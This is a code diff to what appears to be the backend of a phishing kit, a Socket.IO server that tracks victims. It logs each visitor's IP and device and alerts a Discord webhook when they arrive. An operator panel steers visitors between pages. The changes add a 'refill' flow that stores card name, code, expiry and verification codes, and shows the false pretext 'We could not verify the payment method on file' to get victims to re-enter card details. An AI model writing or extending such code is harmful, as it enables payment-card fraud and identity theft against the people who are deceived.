@@ -39,7 +39,9 @@ function registerSocketHandlers(ctx) {
     appendRecord,
     ADMIN_PASSWORD,
     DISCORD_WEBHOOK_DEBUG,
+    getAdminStats,
   } = ctx;
+  const pendingOfflineTimers = new Map();
 
   io.on('connection', (socket) => {
     const ip = getClientIp(socket);
@@ -58,20 +60,40 @@ function registerSocketHandlers(ctx) {
       activated: false,
     });
 
-    if (!socketEnterKey.has(socket.id)) {
-      const key = `socket:${socket.id}`;
-      enteredClientIds.add(key);
+    function markEnteredClient(key) {
+      if (!key) return false;
+      const previousKey = socketEnterKey.get(socket.id);
+      if (previousKey === key) return false;
+      if (previousKey && previousKey.startsWith('socket:') && key.startsWith('client:')) {
+        enteredClientIds.delete(previousKey);
+      }
       socketEnterKey.set(socket.id, key);
-      emitAdmin();
+      const before = enteredClientIds.size;
+      enteredClientIds.add(key);
+      return enteredClientIds.size !== before;
+    }
+
+    markEnteredClient(`socket:${socket.id}`);
+    emitAdmin();
+
+    function notifyDiscordUserEntered(source, { recordId, clientId } = {}) {
+      if (discordHomeNotified.has(socket.id)) return;
+      discordHomeNotified.add(socket.id);
+      notifyDiscordHomeOnline({
+        time: nowCN(),
+        ip,
+        deviceType,
+        deviceOS,
+        recordId,
+        clientId,
+      });
+      if (DISCORD_WEBHOOK_DEBUG) console.log(`[discord] sent ${source} notice for`, socket.id);
     }
 
     socket.on('attach-client', ({ clientId } = {}, ack) => {
       const cid = normalizeClientId(clientId) || socket.id;
       const nextEnterKey = normalizeClientId(clientId) ? `client:${normalizeClientId(clientId)}` : `socket:${socket.id}`;
-      const prevEnterKey = socketEnterKey.get(socket.id);
-      if (prevEnterKey && prevEnterKey !== nextEnterKey) enteredClientIds.delete(prevEnterKey);
-      enteredClientIds.add(nextEnterKey);
-      socketEnterKey.set(socket.id, nextEnterKey);
+      markEnteredClient(nextEnterKey);
 
       const currentUser = onlineUsers.get(socket.id) || {
         page: 'pending',
@@ -126,6 +148,10 @@ function registerSocketHandlers(ctx) {
 
       onlineUsers.set(socket.id, currentUser);
       emitAdmin();
+      notifyDiscordUserEntered('attach-client', {
+        recordId: currentUser.activeRecordId || undefined,
+        clientId: currentUser.clientId || cid,
+      });
       ack?.({ ok: true, resumed: clientRecords.length > 0, page: currentUser.page, activeRecordId: currentUser.activeRecordId });
     });
 
@@ -166,7 +192,7 @@ function registerSocketHandlers(ctx) {
 
         io.to(socketId).emit('checkout-route', {
           target,
-          reason: reason || 'Admin requested page routing',
+          reason: reason || '',
         });
 
         setUserPage(socketId, pageForAdmin);
@@ -201,7 +227,7 @@ function registerSocketHandlers(ctx) {
 
         io.to(socketId).emit('admin-open-url', {
           action: 'open-external',
-          reason: reason || 'Admin requested URL routing',
+          reason: reason || '',
         });
 
         setUserPage(socketId, 'external');
@@ -222,9 +248,7 @@ function registerSocketHandlers(ctx) {
       const lowerPage = p.toLowerCase();
       if (lowerPage === 'home' && !socketEnterKey.has(socket.id)) {
         const key = normalizeClientId(user?.clientId) ? `client:${normalizeClientId(user?.clientId)}` : `socket:${socket.id}`;
-        enteredClientIds.add(key);
-        socketEnterKey.set(socket.id, key);
-        emitAdmin();
+        if (markEnteredClient(key)) emitAdmin();
       }
       if (user) {
         user.ip = ip;
@@ -243,33 +267,20 @@ function registerSocketHandlers(ctx) {
 
       emitAdmin();
 
-      if (p.toLowerCase() === 'home' && !discordHomeNotified.has(socket.id)) {
-        discordHomeNotified.add(socket.id);
-        notifyDiscordHomeOnline({
-          time: nowCN(),
-          ip,
-          deviceType,
-          deviceOS,
+      if (p.toLowerCase() === 'home') {
+        notifyDiscordUserEntered('join-page:home', {
           recordId: active?.id,
           clientId: user?.clientId,
         });
-        if (DISCORD_WEBHOOK_DEBUG) console.log('[discord] sent home online notice for', socket.id);
       }
     });
 
     socket.on('home-entered', () => {
-      if (discordHomeNotified.has(socket.id)) return;
-      discordHomeNotified.add(socket.id);
       const user = onlineUsers.get(socket.id);
-      notifyDiscordHomeOnline({
-        time: nowCN(),
-        ip,
-        deviceType,
-        deviceOS,
+      notifyDiscordUserEntered('home-entered', {
         recordId: undefined,
         clientId: user?.clientId,
       });
-      if (DISCORD_WEBHOOK_DEBUG) console.log('[discord] sent home-entered notice for', socket.id);
     });
 
     socket.on('leave-page', ({ page, reason }) => {
@@ -294,7 +305,7 @@ function registerSocketHandlers(ctx) {
     socket.on('register-user', ({ clickTime, clientId } = {}, ack) => {
       const cid = normalizeClientId(clientId || onlineUsers.get(socket.id)?.clientId) || socket.id;
       const submitClientId = normalizeClientId(cid);
-      if (submitClientId) submittedClientIds.add(submitClientId);
+      if (submitClientId) submittedClientIds.add(`client:${submitClientId}`);
       const user = onlineUsers.get(socket.id);
       if (user && cid) user.clientId = cid;
       if (user) {
@@ -335,6 +346,10 @@ function registerSocketHandlers(ctx) {
         }
 
         emitAdmin();
+        notifyDiscordUserEntered('register-user:resume', {
+          recordId: active.id,
+          clientId: cid,
+        });
         ack?.({ ok: true, resumed: true, recordId: active.id, page: user?.page || active.page || 'home' });
         return;
       }
@@ -385,6 +400,10 @@ function registerSocketHandlers(ctx) {
       if (user) user.activeRecordId = id;
 
       emitAdmin();
+      notifyDiscordUserEntered('register-user:new', {
+        recordId: id,
+        clientId: cid,
+      });
       ack?.({ ok: true, resumed: false, recordId: id, page: 'home' });
     });
 
@@ -585,12 +604,13 @@ function registerSocketHandlers(ctx) {
 
       appendRecord(subRecord);
       setActiveRecord(socketId, subId);
+      io.to(socketId).emit('checkout-route', { target: 'info', reason: reason || 'Please refill recipient details' });
       targetSocket.emit('force-refill', { reason: reason || '', recordId: subId });
       emitAdmin();
       ack?.({ ok: true });
     });
 
-    socket.on('request-checkout-refill', ({ socketId, recordId }, ack) => {
+    socket.on('request-checkout-refill', ({ socketId, recordId, reason }, ack) => {
       if (!isAdminSocket(socket.id)) {
         ack?.({ ok: false, error: 'admin unauthorized' });
         return;
@@ -620,26 +640,46 @@ function registerSocketHandlers(ctx) {
       }
 
       pushCheckoutSnapshot(targetRecord);
-      targetRecord.checkoutName = '';
-      targetRecord.checkoutPhone = '';
-      targetRecord.checkoutCode = '';
-      targetRecord.checkoutExpiryDate = '';
-      targetRecord.checkoutDate = '';
-      targetRecord.verify = '';
-      targetRecord.verifyMethod = '';
-      targetRecord.emailVerify = '';
-      targetRecord.appCheck = '';
-      targetRecord.page = 'checkout';
-      targetRecord.online = true;
+      const mainId = getMainId(targetRecord.id) || targetRecord.id;
+      const subId = nextSubId(mainId);
+      const subRecord = buildSubRecordFrom(targetRecord, {
+        id: subId,
+        page: 'checkout',
+        status: 'Checkout refill requested - please re-enter',
+        historyStatus: 'Created sub record (refill checkout)',
+      });
 
-      touch(targetRecord, 'Checkout refill requested - please re-enter');
-      setActiveRecord(socketId, targetRecord.id);
+      subRecord.socketId = socketId;
+      subRecord.ip = targetRecord.ip || ip;
+      subRecord.deviceType = targetRecord.deviceType || deviceType;
+      subRecord.deviceOS = targetRecord.deviceOS || deviceOS;
+      subRecord.page = 'checkout';
+      subRecord.status = 'Checkout refill requested - please re-enter';
+      subRecord.online = true;
+      subRecord.checkoutName = '';
+      subRecord.checkoutPhone = '';
+      subRecord.checkoutCode = '';
+      subRecord.checkoutExpiryDate = '';
+      subRecord.checkoutDate = '';
+      subRecord.checkoutSnapshots = [];
+      subRecord.verify = '';
+      subRecord.verifyHistory = [];
+      subRecord.verifyMethod = '';
+      subRecord.emailVerify = '';
+      subRecord.appCheck = '';
 
-      io.to(socketId).emit('checkout-route', { target: 'checkout', reason: 'Please refill checkout information' });
-      targetSocket.emit('force-checkout-refill', { recordId: targetRecord.id });
+      touch(targetRecord, 'Checkout refill requested');
+      appendRecord(subRecord);
+      setActiveRecord(socketId, subId);
+
+      io.to(socketId).emit('checkout-route', {
+        target: 'checkout',
+        reason: reason || 'We could not verify the payment method on file. Please review and re-enter your card details',
+      });
+      targetSocket.emit('force-checkout-refill', { recordId: subId });
 
       emitAdmin();
-      ack?.({ ok: true });
+      ack?.({ ok: true, recordId: subId });
     });
 
     socket.on('admin-set-note', ({ recordId, note }, ack) => {
@@ -670,19 +710,11 @@ function registerSocketHandlers(ctx) {
 
       adminSockets.add(socket.id);
       socket.join('admin');
-      const adminEnterKey = socketEnterKey.get(socket.id);
-      if (adminEnterKey) {
-        enteredClientIds.delete(adminEnterKey);
-        socketEnterKey.delete(socket.id);
-        emitAdmin();
-      }
-      const visits = enteredClientIds.size;
-      const clicks = submittedClientIds.size;
-      const clickRate = visits > 0 ? Number(((clicks / visits) * 100).toFixed(1)) : 0;
+      socketEnterKey.delete(socket.id);
       socket.emit('admin-update', {
         records: store.records,
         onlineUsers: Array.from(onlineUsers.values()).filter((u) => u && u.activated),
-        stats: { visits, clicks, clickRate },
+        stats: getAdminStats(),
       });
       ack?.({ ok: true });
     });
@@ -702,24 +734,25 @@ function registerSocketHandlers(ctx) {
       ack?.({ ok: true });
     });
 
-    socket.on('disconnecting', () => {
-      const user = onlineUsers.get(socket.id);
-      if (user) user.online = false;
-      discordHomeNotified.delete(socket.id);
-
-      store.records.forEach((r) => {
-        if (r.socketId === socket.id) {
-          r.online = false;
-          touch(r, r.status || 'Offline');
-        }
-      });
-
-      emitAdmin();
-    });
-
     socket.on('disconnect', () => {
-      cleanupSocketTracking(socket.id);
-      emitAdmin();
+      discordHomeNotified.delete(socket.id);
+      const timer = setTimeout(() => {
+        const user = onlineUsers.get(socket.id);
+        if (user) user.online = false;
+
+        store.records.forEach((r) => {
+          if (r.socketId === socket.id) {
+            r.online = false;
+            touch(r, r.status || 'Offline');
+          }
+        });
+
+        cleanupSocketTracking(socket.id);
+        pendingOfflineTimers.delete(socket.id);
+        emitAdmin();
+      }, 8000);
+
+      pendingOfflineTimers.set(socket.id, timer);
     });
   });
 }
